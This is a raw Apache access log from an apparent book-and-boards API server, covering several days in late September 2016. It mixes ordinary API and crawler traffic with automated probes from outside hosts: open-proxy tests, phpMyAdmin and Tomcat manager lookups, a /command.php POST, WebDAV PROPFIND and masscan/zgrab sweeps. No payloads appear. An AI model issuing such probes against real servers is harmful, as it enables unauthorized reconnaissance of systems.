66.249.84.208 - - [27/Sep/2016:19:03:28 -0600] "GET /v1/volume/1/book/1 HTTP/1.1" 200 1063 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
::1 - - [27/Sep/2016:19:03:34 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) PHP/5.6.25 (internal dummy connection)"
185.93.185.10 - - [27/Sep/2016:19:14:50 -0600] "GET / HTTP/1.1" 200 597 "-" "-"
91.196.50.33 - - [27/Sep/2016:19:59:15 -0600] "GET http://testp1.piwo.pila.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
192.187.118.18 - - [28/Sep/2016:01:04:17 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
91.196.50.33 - - [28/Sep/2016:03:17:21 -0600] "GET http://testp4.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
75.75.210.162 - - [28/Sep/2016:05:51:00 -0600] "GET /user/soapCaller.bs HTTP/1.1" 404 216 "-" "Morfeus Fucking Scanner"
75.75.210.162 - - [28/Sep/2016:05:51:10 -0600] "GET /user/soapCaller.bs HTTP/1.1" 404 216 "-" "Morfeus Fucking Scanner"
63.141.231.195 - - [28/Sep/2016:06:15:37 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
91.196.50.33 - - [28/Sep/2016:07:48:39 -0600] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
222.186.34.141 - - [28/Sep/2016:09:12:52 -0600] "GET /manager/html HTTP/1.1" 404 210 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)"
66.249.84.210 - - [28/Sep/2016:11:27:31 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
66.249.84.212 - - [28/Sep/2016:11:27:31 -0600] "GET /v1/ HTTP/1.1" 200 55 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
66.249.84.212 - - [28/Sep/2016:11:27:31 -0600] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
66.249.84.208 - - [28/Sep/2016:11:27:31 -0600] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
66.249.84.212 - - [28/Sep/2016:11:27:31 -0600] "GET /v1/volume/3 HTTP/1.1" 200 3459 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
66.249.84.210 - - [28/Sep/2016:11:27:31 -0600] "GET /v1/volume/1/book/1 HTTP/1.1" 200 1063 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
::1 - - [28/Sep/2016:11:27:36 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) PHP/5.6.25 (internal dummy connection)"
::1 - - [28/Sep/2016:11:27:37 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) PHP/5.6.25 (internal dummy connection)"
180.97.106.37 - - [28/Sep/2016:12:20:08 -0600] "HEAD http://180.163.113.82/check_proxy HTTP/1.1" 404 - "-" "-"
185.25.151.159 - - [28/Sep/2016:12:54:04 -0600] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
222.174.5.7 - - [28/Sep/2016:13:35:42 -0600] "GET /phpmyadmin HTTP/1.1" 404 208 "http://23.239.11.57/phpmyadmin" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"
185.139.2.66 - - [28/Sep/2016:14:48:25 -0600] "GET /logs HTTP/1.1" 404 202 "-" "-"
212.129.54.164 - - [28/Sep/2016:15:55:20 -0600] "PROPFIND /webdav/ HTTP/1.1" 405 233 "-" "WEBDAV Client"
93.174.93.218 - - [28/Sep/2016:18:04:30 -0600] "GET http://httpheader.net/ HTTP/1.1" 200 597 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28 (.NET CLR 3.5.30729)"
93.174.93.218 - - [28/Sep/2016:18:05:11 -0600] "-" 408 - "-" "-"
179.209.31.215 - - [28/Sep/2016:18:33:07 -0600] "GET /cgi/common.cgi HTTP/1.0" 404 212 "-" "Wget(linux)"
179.209.31.215 - - [28/Sep/2016:18:33:07 -0600] "GET /stssys.htm HTTP/1.0" 404 208 "-" "Wget(linux)"
179.209.31.215 - - [28/Sep/2016:18:33:07 -0600] "GET / HTTP/1.0" 200 597 "-" "Wget(linux)"
179.209.31.215 - - [28/Sep/2016:18:33:08 -0600] "POST /command.php HTTP/1.0" 404 209 "-" "Wget(linux)"
2600:3c03::f03c:91ff:fe79:ba6f - - [28/Sep/2016:19:04:24 -0600] "GET /v1//users/1/boards HTTP/1.1" 200 409 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [28/Sep/2016:19:04:30 -0600] "GET /v1//users/1/board/19 HTTP/1.1" 200 237 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [28/Sep/2016:19:04:30 -0600] "GET /v1//volumes HTTP/1.1" 200 1319 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [28/Sep/2016:19:04:33 -0600] "GET /v1//volume/3 HTTP/1.1" 200 3459 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [28/Sep/2016:19:04:35 -0600] "GET /v1//volume/3 HTTP/1.1" 200 3459 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [28/Sep/2016:19:04:36 -0600] "GET /v1//volume/3/book/3 HTTP/1.1" 200 314 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [28/Sep/2016:19:04:38 -0600] "GET /v1//volume/3/book/3/chapter/1 HTTP/1.1" 200 8370 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [28/Sep/2016:19:04:44 -0600] "GET /v1//users/1/board/19/block/6 HTTP/1.1" 200 253 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [28/Sep/2016:19:04:51 -0600] "GET /v1//users/1/board/19/block/6 HTTP/1.1" 200 587 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [28/Sep/2016:19:04:52 -0600] "GET /v1//users/1/board/19/block/6 HTTP/1.1" 200 587 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [28/Sep/2016:19:06:30 -0600] "GET /v1//users/1/board/19/block/6 HTTP/1.1" 200 587 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [28/Sep/2016:19:06:51 -0600] "GET /v1//users/1/boards HTTP/1.1" 200 409 "-" "-"
144.38.193.82 - - [28/Sep/2016:19:07:41 -0600] "-" 408 - "-" "-"
144.38.193.82 - - [28/Sep/2016:19:07:41 -0600] "-" 408 - "-" "-"
144.38.193.82 - - [28/Sep/2016:19:07:41 -0600] "-" 408 - "-" "-"
144.38.193.82 - - [28/Sep/2016:19:07:41 -0600] "-" 408 - "-" "-"
185.25.151.159 - - [28/Sep/2016:21:31:46 -0600] "GET http://testp4.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
185.25.151.159 - - [28/Sep/2016:22:02:40 -0600] "GET http://testp1.piwo.pila.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
212.92.127.172 - - [29/Sep/2016:01:19:39 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0"
8.36.123.216 - - [29/Sep/2016:04:03:30 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
63.141.231.197 - - [29/Sep/2016:05:07:38 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
185.93.185.237 - - [29/Sep/2016:05:19:34 -0600] "\x03" 400 226 "-" "-"
173.208.213.197 - - [29/Sep/2016:06:33:45 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
185.49.14.190 - - [29/Sep/2016:07:29:47 -0600] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
173.208.213.196 - - [29/Sep/2016:08:33:46 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
91.196.50.33 - - [29/Sep/2016:08:56:04 -0600] "GET http://testp1.piwo.pila.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
46.172.91.20 - - [29/Sep/2016:10:03:15 -0600] "GET / HTTP/1.1" 200 597 "-" "Scanbot"
2600:3c03::f03c:91ff:fe79:ba6f - - [29/Sep/2016:10:08:24 -0600] "GET /v1//users/16/boards HTTP/1.1" 200 804 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [29/Sep/2016:10:08:48 -0600] "GET /v1//users/16/board/16 HTTP/1.1" 200 527 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [29/Sep/2016:10:08:49 -0600] "GET /v1//volumes HTTP/1.1" 200 1319 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [29/Sep/2016:10:08:53 -0600] "GET /v1//volume/1 HTTP/1.1" 200 8519 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [29/Sep/2016:10:08:56 -0600] "GET /v1//volume/1 HTTP/1.1" 200 8519 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [29/Sep/2016:10:08:56 -0600] "GET /v1//volume/1/book/1 HTTP/1.1" 200 1063 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [29/Sep/2016:10:08:58 -0600] "GET /v1//volume/1/book/1/chapter/1 HTTP/1.1" 200 11065 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [29/Sep/2016:10:09:07 -0600] "GET /v1//users/16/board/16/block/18 HTTP/1.1" 200 445 "-" "-"
192.187.118.70 - - [29/Sep/2016:10:12:39 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
142.54.180.70 - - [29/Sep/2016:10:56:40 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
201.152.116.168 - - [29/Sep/2016:12:16:43 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)"
92.53.52.129 - - [29/Sep/2016:12:16:43 -0600] "GET / HTTP/1.0" 200 597 "-" "-"
204.12.217.3 - - [29/Sep/2016:13:02:45 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
185.49.14.190 - - [29/Sep/2016:16:35:21 -0600] "GET http://testp4.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
212.129.54.164 - - [29/Sep/2016:18:41:17 -0600] "PROPFIND /webdav/ HTTP/1.1" 405 233 "-" "WEBDAV Client"
180.76.15.141 - - [29/Sep/2016:20:03:28 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
93.174.93.218 - - [29/Sep/2016:20:44:05 -0600] "GET http://httpheader.net/ HTTP/1.1" 200 597 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28 (.NET CLR 3.5.30729)"
93.174.93.218 - - [29/Sep/2016:20:44:47 -0600] "-" 408 - "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [29/Sep/2016:22:34:34 -0600] "GET /v1//users/16/boards HTTP/1.1" 200 804 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [29/Sep/2016:22:35:16 -0600] "GET /v1//users/16/board/16 HTTP/1.1" 200 527 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [29/Sep/2016:22:35:17 -0600] "GET /v1//volumes HTTP/1.1" 200 1319 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [29/Sep/2016:22:35:21 -0600] "GET /v1//users/16/board/16/block/18 HTTP/1.1" 200 445 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [29/Sep/2016:22:35:23 -0600] "GET /v1//users/16/board/16/block/18 HTTP/1.1" 200 445 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [29/Sep/2016:22:35:23 -0600] "GET /v1//users/16/board/16/block/17 HTTP/1.1" 200 1337 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [29/Sep/2016:22:35:25 -0600] "GET /v1//users/16/board/16/block/19 HTTP/1.1" 200 696 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [29/Sep/2016:22:35:26 -0600] "GET /v1//users/16/board/16/block/20 HTTP/1.1" 200 284 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [29/Sep/2016:22:35:28 -0600] "GET /v1//users/16/board/16/block/19 HTTP/1.1" 200 696 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [29/Sep/2016:22:35:29 -0600] "GET /v1//users/16/board/16/block/17 HTTP/1.1" 200 1337 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [29/Sep/2016:22:35:30 -0600] "GET /v1//users/16/board/16/block/18 HTTP/1.1" 200 445 "-" "-"
185.49.14.190 - - [29/Sep/2016:23:33:10 -0600] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
222.186.56.80 - - [30/Sep/2016:01:31:25 -0600] "GET /phpmyadmin HTTP/1.1" 404 208 "http://23.239.11.57/phpmyadmin" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"
185.25.151.159 - - [30/Sep/2016:01:58:39 -0600] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
213.128.81.66 - - [30/Sep/2016:02:02:55 -0600] "GET / HTTP/1.0" 200 597 "-" "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
2600:3c03::f03c:91ff:fe79:ba6f - - [30/Sep/2016:05:59:39 -0600] "GET /v1//users/16/boards HTTP/1.1" 200 804 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [30/Sep/2016:05:59:43 -0600] "GET /v1//users/16/board/16 HTTP/1.1" 200 527 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [30/Sep/2016:05:59:44 -0600] "GET /v1//volumes HTTP/1.1" 200 1319 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [30/Sep/2016:05:59:47 -0600] "GET /v1//users/16/board/16/block/20 HTTP/1.1" 200 284 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [30/Sep/2016:05:59:49 -0600] "GET /v1//users/16/board/16/block/19 HTTP/1.1" 200 696 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [30/Sep/2016:05:59:50 -0600] "GET /v1//users/16/board/16/block/18 HTTP/1.1" 200 445 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [30/Sep/2016:05:59:51 -0600] "GET /v1//users/16/board/16/block/17 HTTP/1.1" 200 1337 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [30/Sep/2016:05:59:53 -0600] "GET /v1//users/16/board/16/block/18 HTTP/1.1" 200 445 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [30/Sep/2016:06:02:03 -0600] "GET /v1//volume/7 HTTP/1.1" 200 141 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [30/Sep/2016:06:02:07 -0600] "GET /v1//volumes HTTP/1.1" 200 1319 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [30/Sep/2016:06:02:10 -0600] "GET /v1//volume/6 HTTP/1.1" 200 1458 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [30/Sep/2016:06:02:13 -0600] "GET /v1//volume/6 HTTP/1.1" 200 1458 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [30/Sep/2016:06:02:14 -0600] "GET /v1//volume/6/book/5 HTTP/1.1" 200 1421 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [30/Sep/2016:06:02:20 -0600] "GET /v1//volume/6/book/5/chapter/5 HTTP/1.1" 200 3646 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [30/Sep/2016:06:02:57 -0600] "GET /v1//volume/6/book/5/chapter/15 HTTP/1.1" 200 1851 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [30/Sep/2016:06:03:49 -0600] "GET /v1//volume/6/book/5/chapter/-1 HTTP/1.1" 200 258 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [30/Sep/2016:06:03:52 -0600] "GET /v1//volume/6 HTTP/1.1" 200 1458 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [30/Sep/2016:06:03:56 -0600] "GET /v1//volume/6 HTTP/1.1" 200 1458 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [30/Sep/2016:06:03:56 -0600] "GET /v1//volume/6/book/6 HTTP/1.1" 200 2703 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [30/Sep/2016:06:04:00 -0600] "GET /v1//volume/6/book/6/chapter/5 HTTP/1.1" 200 1867 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [30/Sep/2016:06:04:14 -0600] "GET /v1//volume/6/book/6/chapter/7 HTTP/1.1" 200 1359 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [30/Sep/2016:06:04:18 -0600] "GET /v1//volume/6/book/6/chapter/8 HTTP/1.1" 200 4142 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [30/Sep/2016:06:04:25 -0600] "GET /v1//volume/6/book/6/chapter/1 HTTP/1.1" 200 657 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [30/Sep/2016:06:04:33 -0600] "GET /v1//volume/6/book/6/chapter/2 HTTP/1.1" 200 2966 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [30/Sep/2016:06:04:46 -0600] "GET /v1//users/16/board/16/block/20 HTTP/1.1" 200 711 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [30/Sep/2016:06:04:57 -0600] "GET /v1//users/16/board/16/block/19 HTTP/1.1" 200 696 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [30/Sep/2016:06:04:59 -0600] "GET /v1//users/16/board/16/block/17 HTTP/1.1" 200 1337 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [30/Sep/2016:06:05:31 -0600] "GET /v1//users/16/board/16/block/18 HTTP/1.1" 200 445 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [30/Sep/2016:06:05:33 -0600] "GET /v1//users/16/board/16/block/17 HTTP/1.1" 200 1337 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [30/Sep/2016:06:05:34 -0600] "GET /v1//users/16/board/16/block/19 HTTP/1.1" 200 696 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [30/Sep/2016:06:05:34 -0600] "GET /v1//users/16/board/16/block/20 HTTP/1.1" 200 711 "-" "-"
103.213.251.70 - - [30/Sep/2016:06:16:42 -0600] "GET /phpMyAdmin HTTP/1.1" 404 208 "http://23.239.11.57/phpMyAdmin" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"
125.88.146.145 - - [30/Sep/2016:08:58:58 -0600] "GET /phpmyadmin HTTP/1.1" 404 208 "http://23.239.11.57/phpmyadmin" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"
93.174.93.218 - - [30/Sep/2016:09:24:52 -0600] "GET http://httpheader.net/ HTTP/1.1" 200 597 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28 (.NET CLR 3.5.30729)"
93.174.93.218 - - [30/Sep/2016:09:25:33 -0600] "-" 408 - "-" "-"
139.162.13.205 - - [30/Sep/2016:10:03:44 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
185.25.151.159 - - [30/Sep/2016:10:36:34 -0600] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
182.118.53.123 - - [30/Sep/2016:10:57:33 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36"
201.183.237.8 - - [30/Sep/2016:17:03:07 -0600] "GET /manager/html HTTP/1.1" 404 210 "-" "Mozilla/3.0 (compatible; Indy Library)"
201.183.237.8 - - [30/Sep/2016:17:34:01 -0600] "GET /manager/html HTTP/1.1" 404 210 "-" "Mozilla/3.0 (compatible; Indy Library)"
191.96.249.189 - - [30/Sep/2016:18:05:57 -0600] "GET /index.html HTTP/1.0" 404 208 "-" "-"
141.212.122.16 - - [30/Sep/2016:18:32:27 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/5.0 zgrab/0.x"
185.25.151.159 - - [30/Sep/2016:19:44:45 -0600] "GET http://testp4.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
191.96.249.189 - - [30/Sep/2016:20:01:40 -0600] "GET /index.html HTTP/1.0" 404 208 "-" "-"
204.12.217.6 - - [30/Sep/2016:22:19:20 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
180.76.15.17 - - [30/Sep/2016:23:01:27 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
185.25.151.159 - - [30/Sep/2016:23:48:08 -0600] "GET http://testp4.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
212.129.54.164 - - [01/Oct/2016:01:55:59 -0600] "PROPFIND /webdav/ HTTP/1.1" 405 233 "-" "WEBDAV Client"
167.114.40.7 - - [01/Oct/2016:02:46:12 -0600] "PROPFIND /webdav/ HTTP/1.1" 405 233 "-" "WEBDAV Client"
185.49.14.190 - - [01/Oct/2016:05:20:07 -0600] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
185.25.148.240 - - [01/Oct/2016:05:22:18 -0600] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
63.141.250.154 - - [01/Oct/2016:06:41:58 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
2600:3c03::f03c:91ff:fe79:ba6f - - [01/Oct/2016:08:26:37 -0600] "GET /v1//users/16/boards HTTP/1.1" 200 804 "-" "-"
69.30.226.221 - - [01/Oct/2016:09:18:52 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
91.196.50.33 - - [01/Oct/2016:12:22:34 -0600] "GET http://testp4.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
2600:3c03::f03c:91ff:fe79:ba6f - - [01/Oct/2016:12:54:32 -0600] "GET /v1//users/16/boards HTTP/1.1" 200 804 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [01/Oct/2016:12:54:37 -0600] "GET /v1//users/16/board/16 HTTP/1.1" 200 527 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [01/Oct/2016:12:54:37 -0600] "GET /v1//volumes HTTP/1.1" 200 1319 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [01/Oct/2016:12:54:42 -0600] "GET /v1//users/16/board/16/block/19 HTTP/1.1" 200 696 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [01/Oct/2016:12:54:43 -0600] "GET /v1//users/16/board/16/block/20 HTTP/1.1" 200 711 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [01/Oct/2016:12:54:45 -0600] "GET /v1//users/16/board/16/block/18 HTTP/1.1" 200 445 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [01/Oct/2016:12:55:03 -0600] "GET /v1//users/16/board/16/block/20 HTTP/1.1" 200 711 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [01/Oct/2016:12:55:05 -0600] "GET /v1//users/16/board/16/block/19 HTTP/1.1" 200 696 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [01/Oct/2016:12:55:07 -0600] "GET /v1//users/16/board/16/block/17 HTTP/1.1" 200 1337 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [01/Oct/2016:12:55:08 -0600] "GET /v1//users/16/board/16/block/18 HTTP/1.1" 200 445 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [01/Oct/2016:12:55:10 -0600] "GET /v1//users/16/board/16/block/17 HTTP/1.1" 200 1337 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [01/Oct/2016:12:55:16 -0600] "GET /v1//volume/5 HTTP/1.1" 200 1382 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [01/Oct/2016:12:56:27 -0600] "GET /v1//users/16/board/16/block/18 HTTP/1.1" 200 445 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [01/Oct/2016:12:56:33 -0600] "GET /v1//users/16/board/16/block/19 HTTP/1.1" 200 696 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [01/Oct/2016:12:56:35 -0600] "GET /v1//users/16/board/16/block/20 HTTP/1.1" 200 711 "-" "-"
